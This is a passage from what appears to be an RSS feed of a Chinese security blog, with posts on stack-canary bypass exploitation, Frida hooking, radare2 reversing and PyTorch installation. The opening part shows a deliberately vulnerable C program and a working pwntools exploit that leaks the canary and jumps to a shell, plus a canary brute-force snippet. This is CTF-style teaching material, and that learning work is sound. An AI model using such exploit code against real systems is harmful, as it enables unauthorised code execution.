</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getshell</span>(<span style="color:#66d9ef">void</span>) {
    system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>() {
    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>];
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>;i<span style="color:#f92672">++</span>){
        read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x200</span>);
        printf(buf);
    }
}
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
    init();
    puts(<span style="color:#e6db74">&#34;Hello Hacker!&#34;</span>);
    vuln();
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>EXP</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
   
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
   
context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ex2&#39;</span><span style="color:#75715e">#全局系统自动设置，为官方推荐设置，ex2为文件名称。</span>
<span style="color:#75715e">#context.log_level = &#39;debug&#39;#debug模式下才开启</span>
io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ex2&#39;</span>) <span style="color:#75715e">#本地连接到ex2</span>
   
get_shell <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ex2&#34;</span>)<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;getshell&#34;</span>] <span style="color:#75715e">#由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。</span>
   
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello Hacker!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#75715e">#接受传来的第一部分字符</span>
   
<span style="color:#75715e"># leak Canary</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span> 
io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#传输100个A</span>
   
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>)
Canary <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))<span style="color:#f92672">-</span><span style="color:#ae81ff">0xa</span> <span style="color:#75715e">#因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Canary:&#34;</span><span style="color:#f92672">+</span>hex(Canary))<span style="color:#75715e">#日志记录下canary</span>
   
<span style="color:#75715e"># Bypass Canary</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span>p32(Canary)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span><span style="color:#f92672">+</span>p32(get_shell)<span style="color:#75715e">#发送最后的payload</span>
io<span style="color:#f92672">.</span>send(payload)
   
io<span style="color:#f92672">.</span>recv()
   
io<span style="color:#f92672">.</span>interactive()
</code></pre></div></li>
<li>
<p>one-by-one 爆破 Canary</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Brute forcing stack canary &#34;</span>
  
start <span style="color:#f92672">=</span> len(p)
stop <span style="color:#f92672">=</span> len(p)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>
  
<span style="color:#66d9ef">while</span> len(p) <span style="color:#f92672">&lt;</span> stop:
   <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">256</span>):
      res <span style="color:#f92672">=</span> send2server(p <span style="color:#f92672">+</span> chr(i))
  
      <span style="color:#66d9ef">if</span> res <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
         p <span style="color:#f92672">=</span> p <span style="color:#f92672">+</span> chr(i)
         <span style="color:#75715e">#print &#34;\t[+] Byte found 0x%02x&#34; % i</span>
         <span style="color:#66d9ef">break</span>
  
      <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>:
         <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[-] Exploit failed&#34;</span>
         sys<span style="color:#f92672">.</span>exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
  
  
canary <span style="color:#f92672">=</span> p[stop:start<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;   [+] SSP value is 0x</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> 
</code></pre></div></li>
<li>
<p>canary劫持__stack_chk_fail 函数</p>
</li>
<li>
<p>覆盖 TLS 中储存的 Canary 值</p>
</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Frida从入门到放弃_2</title>
            <link>https://kuekiko.top/posts/2019/02/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2/</link>
            <pubDate>Sat, 02 Feb 2019 20:39:26 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/02/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2/</guid>
            <description>0x00 前言 复习一下Android安装frida命令
adb rootadb push frida-server /data/local/tmpadb shell &amp;#34;chmod 755 /data/local/tmp/frida-server&amp;#34;adb shell &amp;#34;/data/local/tmp/frida-server &amp;amp;&amp;#34;常用Frida 命令
frida-ps -U #列出USB设备运行ing的进程frida-ps -Ua #列出运行中的应用frida-ps -Uai #列出已安装的应用列表frida-ps -D xxx #连接指定的设备frida-ps -R#在Safari中跟踪recv*和send* APIfrida-trace -i &amp;#34;recv*&amp;#34; -i &amp;#34;send&amp;#34; Safari #在Safari中跟踪ObjC方法调用frida-trace -m &amp;#34;-[NSView drawRect:]&amp;#34; Safari#在iPhone上启动SnapChat，跟踪加密API调用frida-trace -U -f com.app.testing -I &amp;#34;libcommonCrypto*&amp;#34;#当程序启动时，frida跟踪所有open functionfrida-trace -U -i open com.app.testing下面通过自己创建一个Android APP来学习Frida在Android上的一般用法。
0x01 简单用例 Frida常用的两种启动方式：
 python 绑定启动  import fridaimport sys,os## package name pkg_name = &amp;#34;com.</description>
            <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3>
<p>复习一下Android安装frida命令</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adb root
adb push frida-server /data/local/tmp
adb shell <span style="color:#e6db74">&#34;chmod 755 /data/local/tmp/frida-server&#34;</span>
adb shell <span style="color:#e6db74">&#34;/data/local/tmp/frida-server &amp;&#34;</span>
</code></pre></div><p>常用Frida 命令</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">frida-ps -U      <span style="color:#75715e">#列出USB设备运行ing的进程</span>
frida-ps -Ua     <span style="color:#75715e">#列出运行中的应用</span>
frida-ps -Uai    <span style="color:#75715e">#列出已安装的应用列表</span>
frida-ps -D xxx  <span style="color:#75715e">#连接指定的设备</span>
frida-ps -R

<span style="color:#75715e">#在Safari中跟踪recv*和send* API</span>
frida-trace -i <span style="color:#e6db74">&#34;recv*&#34;</span> -i <span style="color:#e6db74">&#34;send&#34;</span> Safari 
<span style="color:#75715e">#在Safari中跟踪ObjC方法调用</span>
frida-trace -m <span style="color:#e6db74">&#34;-[NSView drawRect:]&#34;</span> Safari
<span style="color:#75715e">#在iPhone上启动SnapChat，跟踪加密API调用</span>
frida-trace -U -f com.app.testing -I <span style="color:#e6db74">&#34;libcommonCrypto*&#34;</span>
<span style="color:#75715e">#当程序启动时，frida跟踪所有open function</span>
frida-trace -U -i open com.app.testing
</code></pre></div><p>下面通过自己创建一个Android APP来学习Frida在Android上的一般用法。</p>
<h3 id="0x01-简单用例">0x01 简单用例</h3>
<p>Frida常用的两种启动方式：</p>
<ol>
<li>python 绑定启动</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> frida
<span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span>os

<span style="color:#75715e">## package name</span>
pkg_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;com.example.xxx&#34;</span>
js_hook_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;xxx.js&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">on_message</span>(message,data):
    <span style="color:#66d9ef">if</span> message[<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;send&#39;</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[*] {0}&#34;</span><span style="color:#f92672">.</span>format(message[<span style="color:#e6db74">&#39;payload&#39;</span>]))
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">print</span>(message)
<span style="color:#75715e">## 插入js代码 or 加载js文件</span>
jscode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

script <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
process <span style="color:#f92672">=</span> frida<span style="color:#f92672">.</span>get_usb_device()<span style="color:#f92672">.</span>attach(pkg_name)

<span style="color:#66d9ef">with</span> open(js_hook_file,<span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
    script <span style="color:#f92672">=</span> process<span style="color:#f92672">.</span>create_script(f<span style="color:#f92672">.</span>read())

script<span style="color:#f92672">.</span>on(<span style="color:#e6db74">&#39;message&#39;</span>, on_message)

script<span style="color:#f92672">.</span>load()
sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>read()
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Script loaded successfully &#34;</span>);
<span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perform</span>(<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">x</span>() {

    <span style="color:#75715e">//hook代码
</span><span style="color:#75715e"></span>});
</code></pre></div><ol start="2">
<li>直接命令加载脚本启动</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">frida -U -l xxx.js com.example.xxx
</code></pre></div><h3 id="0x02-app源码">0x02 App源码</h3>
<p>java层</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">
</code></pre></div><p>native层</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
</code></pre></div><h3 id="0x03-java层hook">0x03 Java层hook</h3>
<p>HOOK代码</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">
</code></pre></div><h3 id="0x04-native层hook">0x04 Native层hook</h3>
<p>native层代码</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
</code></pre></div><h3 id="0x05-总结">0x05 总结</h3>
<p>源代码地址：</p>
<h3 id="0x06-参考">0x06 参考</h3>
<ul>
<li><a href="https://www.freebuf.com/articles/system/190565.html">https://www.freebuf.com/articles/system/190565.html</a></li>
<li><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80372118">https://blog.csdn.net/jiangwei0910410003/article/details/80372118</a></li>
<li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Frida从入门到放弃_1</title>
            <link>https://kuekiko.top/posts/2019/01/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1/</link>
            <pubDate>Tue, 22 Jan 2019 20:39:26 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/01/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1/</guid>
            <description>0x00 Frida Frida 官网：https://www.frida.re/
github: https://github.com/frida/frida
Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.
 Scriptable Portable Free Battle-tested  0x01 安装 二进制安装 (推荐) pip install frida-tools 就一个命令搞定
 Failed to load the Frida native extension: DLL load failed: 找不到指定的模块
报了这个错 查了大半天 原来我用的版本是基于python3.7编译的。我现在用的3.6.。。。。
 绑定：二选一就行
pip install frida # Python bindingsnpm install frida # Node.js bindings手动编译 依赖：
pip3 install colorama prompt-toolkit pygments
 Linux  make
 MacOS and iOS  export MAC_CERTID=frida-certexport IOS_CERTID=frida-certmake Windows  frida.</description>
            <content type="html"><![CDATA[<h3 id="0x00-frida">0x00 Frida</h3>
<p>Frida 官网：https://www.frida.re/</p>
<p>github: <a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p>
<p>Dynamic instrumentation toolkit for developers, reverse-engineers, and security
researchers.</p>
<ul>
<li>Scriptable</li>
<li>Portable</li>
<li>Free</li>
<li>Battle-tested</li>
</ul>
<h3 id="0x01-安装">0x01 安装</h3>
<h5 id="二进制安装-推荐">二进制安装 (推荐)</h5>
<p>pip install frida-tools 就一个命令搞定</p>
<blockquote>
<p>Failed to load the Frida native extension: DLL load failed: 找不到指定的模块</p>
<p>报了这个错 查了大半天 原来我用的版本是基于python3.7编译的。我现在用的3.6.。。。。</p>
</blockquote>
<p>绑定：二选一就行</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pip install frida       <span style="color:#75715e"># Python bindings</span>
npm install frida       <span style="color:#75715e"># Node.js bindings</span>
</code></pre></div><h5 id="手动编译">手动编译</h5>
<p>依赖：</p>
<p><code>pip3 install colorama prompt-toolkit pygments</code></p>
<ul>
<li>Linux</li>
</ul>
<p><code>make</code></p>
<ul>
<li>MacOS and iOS</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export MAC_CERTID<span style="color:#f92672">=</span>frida-cert
export IOS_CERTID<span style="color:#f92672">=</span>frida-cert
make
</code></pre></div><ul>
<li>Windows</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">frida.sln <span style="color:#75715e">#VS2017</span>
</code></pre></div><h3 id="0x02-android环境">0x02 Android环境</h3>
<p>设备：小米mix2 运行Android9.0 MIUI10开发版已解锁root</p>
<p>frida-server: 用的arm64版本</p>
<p><a href="https://github.com/frida/frida/releases">server文件下载</a></p>
<p>下载好对应的 frida-server  然后adb push 进去</p>
<p><code>adb push frida-server /data/local/tmp</code></p>
<p>然后<code>chomd 755 frida-server</code>修改权限</p>
<p>运行<code>./frida-server</code></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190112133452.png" alt="frida-server"></p>
<p>这几个命令：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">adb root
adb push frida-server /data/local/tmp
adb shell <span style="color:#e6db74">&#34;chmod 755 /data/local/tmp/frida-server&#34;</span>
adb shell <span style="color:#e6db74">&#34;/data/local/tmp/frida-server &amp;&#34;</span>
</code></pre></div><p>查看架构：</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190616145105.png" alt="aarch64"></p>
<h3 id="0x03-简单测试">0x03 简单测试</h3>
<p>命令行运行<code>frida-ps -U</code></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190112133604.png" alt="frida-ps"></p>
<p>有显示就是连接成功</p>
<p>接下来对浏览器进行简单测试</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190616150349.png" alt=""></p>
<p><code>frida-trace -U -i open com.android.browser</code></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190616150506.png" alt=""></p>
<p>随便点一下浏览器</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190616150623.png" alt=""></p>
<p>测试Diva</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190616151039.jpg" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190616151307.png" alt=""></p>
<p><code>frida-trace -U -i &quot;open*&quot; jakhar.aseem.diva</code></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190616151432.png" alt=""></p>
<p>进行Hook login.class checkout函数</p>
<p>逆向过程略</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190616151826.png" alt=""></p>
<p>HOOK脚本：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perfrom</span>(<span style="color:#66d9ef">function</span>(){
    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;######&#34;</span>)
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">logActivity</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;jakhar.aseem.diva.LogActivity&#34;</span>);
    <span style="color:#a6e22e">logActivity</span>.<span style="color:#a6e22e">checkout</span>.<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Hook&#34;</span>)
    }
})
</code></pre></div><p>命令行载入脚本运行</p>
<p><code>frida -U jakhar.aseem.diva -l diva1.js --no-pause</code></p>
<p>进入logging关卡 点击check out，成功hook到checkout函数。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190616153553.png" alt=""></p>
<h3 id="0x04-总结">0x04 总结</h3>
<hr>
<p>算是简单的入门了frida。</p>
<p>frida还有很多厉害的功能。多读读官方文档，收货会更多。</p>
]]></content>
        </item>
        
        <item>
            <title>radare2&#43;cutter使用指南</title>
            <link>https://kuekiko.top/posts/2019/01/radare2-cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
            <pubDate>Wed, 02 Jan 2019 20:39:26 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/01/radare2-cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
            <description>0x00 介绍 radare2 一个很实用的二进制分析和调试工具
cutter 是r2的GUI版。
0x01 安装 支持的平台有如下：
 Windows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD, Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.
 Linux平台下直接
git clone https://github.com/radare/radare2cd radare2sys/install.sh //(or sys/user.sh)Windows下可以下载二进制安装包安装。官网下载
Windows用户推荐使用Windows下的linux（wsl）来使用， win下更新慢。还是linux下用得舒服（方便，快捷）。
0x03 工具介绍 r2常用的包含有一下组件：
 rax2 用于数值转换 rasm2 反汇编和汇编 rabin2 查看文件格式 radiff2 对文件进行 diff ragg2/ragg2­cc 开发shellcode工具 rahash2 各种密码算法， hash算法 radare2 整合了所有工具  使用帮助直接-h
 rax2   rasm2   rabin2  eg: (-I)</description>
            <content type="html"><![CDATA[<h3 id="0x00-介绍">0x00 介绍</h3>
<p><a href="https://github.com/radare/radare2">radare2</a> 一个很实用的二进制分析和调试工具</p>
<p><a href="https://github.com/radareorg/cutter">cutter</a> 是r2的GUI版。</p>
<h3 id="0x01-安装">0x01 安装</h3>
<p>支持的平台有如下：</p>
<blockquote>
<p>Windows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD,
Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.</p>
</blockquote>
<p>Linux平台下直接</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/radare/radare2
cd radare2
sys/install.sh //<span style="color:#f92672">(</span>or sys/user.sh<span style="color:#f92672">)</span>
</code></pre></div><p>Windows下可以下载二进制安装包安装。官网<a href="https://www.radare.org/r/">下载</a></p>
<p>Windows用户推荐使用Windows下的linux（wsl）来使用， win下更新慢。还是linux下用得舒服（方便，快捷）。</p>
<h3 id="0x03-工具介绍">0x03 工具介绍</h3>
<p>r2常用的包含有一下组件：</p>
<ul>
<li>rax2 用于数值转换</li>
<li>rasm2  反汇编和汇编</li>
<li>rabin2   查看文件格式</li>
<li>radiff2 对文件进行 diff</li>
<li>ragg2/ragg2­cc  开发shellcode工具</li>
<li>rahash2  各种密码算法， hash算法</li>
<li>radare2 整合了所有工具</li>
</ul>
<p>使用帮助直接<code>-h</code></p>
<ul>
<li>rax2</li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123153746.png" alt=""></p>
<ul>
<li>rasm2</li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123153901.png" alt=""></p>
<p><img src="E:%5C%E7%AC%94%E8%AE%B0%5CTypora%5C%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%5Cassets%5C1542959275318.png" alt="1542959275318"></p>
<ul>
<li>rabin2</li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154355.png" alt=""></p>
<p>eg: (<code>-I</code>)</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154422.png" alt=""></p>
<ul>
<li>radiff2</li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154448.png" alt=""></p>
<ul>
<li>ragg2/ragg2­cc</li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154514.png" alt=""></p>
<ul>
<li>rahash2</li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154604.png" alt=""></p>
<ul>
<li>radare2 (最常用) 可缩写为r2</li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123155156.png" alt=""></p>
<h3 id="0x04-r2-实战学习">0x04 r2 实战学习</h3>
<p>challenge来源于：http://reversing.kr</p>
<p>先查看一下文件信息：</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123155334.png" alt=""></p>
<p>GUI?:</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123155444.png" alt=""></p>
<p>用r2载入，自动分析<code>aaa</code>命令：</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123155649.png" alt=""></p>
<p><code>vv</code> 命令查看界面：</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123160028.png" alt=""></p>
<p>注意0x00401080 调用了GetDlgItemTextA</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123160457.png" alt=""></p>
<p>s 调到main函数，查看main的汇编代码：</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123160744.png" alt=""></p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123160818.png" alt=""></p>
<p><code>pdc</code>查看伪代码：</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123161145.png" alt=""></p>
<p>大写的<code>VV</code>命令查看图形界面 使用hijk来进行界面移动。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123161242.png" alt=""></p>
<p>看到调用地址0x401020，s跳过去 ；发现没解析 可使用af来解析。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123162026.png" alt=""></p>
<p>看到GetDlgTemTextA调用：</p>
<p>函数调用</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123162157.png" alt=""></p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181123162302.png" alt=""></p>
<p>差不多逻辑就是一直比对字符串，从第二位开始比最后第一位</p>
<p>得到<code>Ea5yR3versing</code></p>
<p>命令记不住或者想知道有些什么命令可以用就可以加个？号查询</p>
<h3 id="0x05-cutter的使用">0x05 Cutter的使用</h3>
<ul>
<li>多图待补</li>
</ul>
<p><a href="https://legacy.gitbook.com/book/radare/radare2book/details">Radare2 Book</a></p>
]]></content>
        </item>
        
        <item>
            <title>Pytorch学习_1安装</title>
            <link>https://kuekiko.top/posts/2018/12/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/</link>
            <pubDate>Sat, 08 Dec 2018 23:40:51 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/12/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/</guid>
            <description>前言 本来想着用tensorflow的 然而GPU版总是报各种各样的BUG
所以打算入坑一下学pytorch
配置：win10+i76700HQ+GTX1060+16G
软件版本：CUDA10+python3.6+pytorch 1 源码编译
尝试1：官方安装方法不支持 CUDA 10 太坑，社区有编译通过的，所以只有自己编译试试
报各种异常，但是没停，那就等等
CPU被占满，巨卡。
一觉起来之后：安装失败
尝试2：等着完全支持CUDA10之后在用GPU跑吧。
妥协：用阿里云的学生服务器装了CPU的版本：顺便把TensorFlow 也给装了。。
然而 在一个星期之后 pytorch1.0出来了 支持了CUDA10 nice
pip3 install http://download.pytorch.org/whl/cu100/torch-1.0.0-cp36-cp36m-win_amd64.whlpip3 install torchvision期间没有遇到任何问题 真舒畅。。。</description>
            <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>本来想着用<strong>tensorflow</strong>的 然而GPU版总是报各种各样的BUG</p>
<p>所以打算入坑一下学pytorch</p>
<p>配置：win10+i76700HQ+GTX1060+16G</p>
<p>软件版本：CUDA10+python3.6+pytorch 1 源码编译</p>
<p>尝试1：官方安装方法不支持 CUDA 10 太坑，社区有编译通过的，所以只有自己编译试试</p>
<p>报各种异常，但是没停，那就等等</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181204002444.png" alt=""></p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181204153247.png" alt=""></p>
<p>CPU被占满，巨卡。</p>
<p>一觉起来之后：安装失败</p>
<p>尝试2：等着完全支持CUDA10之后在用GPU跑吧。</p>
<p>妥协：用阿里云的学生服务器装了CPU的版本：顺便把TensorFlow 也给装了。。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181204153129.png" alt=""></p>
<p>然而 在一个星期之后 pytorch1.0出来了 支持了CUDA10    nice</p>
<pre><code>pip3 install http://download.pytorch.org/whl/cu100/torch-1.0.0-cp36-cp36m-win_amd64.whl
pip3 install torchvision
</code></pre><p><img src="http://my-md-1253484710.coscd.myqcloud.com/20181208233904.png" alt=""></p>
<p>期间没有遇到任何问题 真舒畅。。。</p>
]]></content>
        </item>
        
        <item>
            <title>PWN 小tools的使用</title>
            <link>https://kuekiko.top/posts/2018/10/pwn-%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
            <pubDate>Mon, 22 Oct 2018 20:39:26 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/10/pwn-%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
